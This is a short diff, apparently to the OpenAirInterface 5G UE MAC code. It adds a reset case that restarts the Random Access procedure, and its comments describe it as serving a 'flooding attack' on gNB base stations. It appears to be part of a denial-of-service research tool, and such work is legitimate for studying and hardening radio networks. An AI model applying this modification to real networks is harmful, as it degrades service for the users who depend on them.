@@ -1792,6 +1792,23 @@ void nr_rrc_mac_config_req_reset(module_id_t module_id, NR_UE_MAC_reset_cause_t 
   AssertFatal(!ret, "mutex failed %d\n", ret);
   fapi_nr_synch_request_t sync_req = {.target_Nid_cell = -1, .ssb_bw_scan = true};
   switch (cause) {
+    // Reset the MAC layer and the SRBs and restart the Random Access procedure
+    case DROP_RRC_RESTART_RA:
+      reset_ra(mac, false);
+      reset_mac_inst(mac);
+      // Note: With UE_NOT_SYNC, some actions will be skipped at the UE (see nr_ue_dl_scheduler function in nr_ue_scheduler.c)
+      // This allows creating new connections slightly faster, however it seems that they will also time out faster at the gNB
+      // Both work for the purposes of the flooding attack (tested with the OAI version 2024.w45)
+      // mac->state = UE_NOT_SYNC;
+      mac->state = UE_PERFORMING_RA; // still in sync but need to restart RA
+      // suspend all RBs except SRB0
+      for (int j = 0; j < mac->lc_ordered_list.count; j++) {
+        nr_lcordered_info_t *lc = mac->lc_ordered_list.array[j];
+        if (lc->rb.type == NR_LCID_SRB && lc->rb.choice.srb_id == 0)
+          continue;
+        lc->rb_suspended = true;
+      }
+      break;
     case GO_TO_IDLE:
       reset_ra(mac, true);
       nr_ue_init_mac(mac);
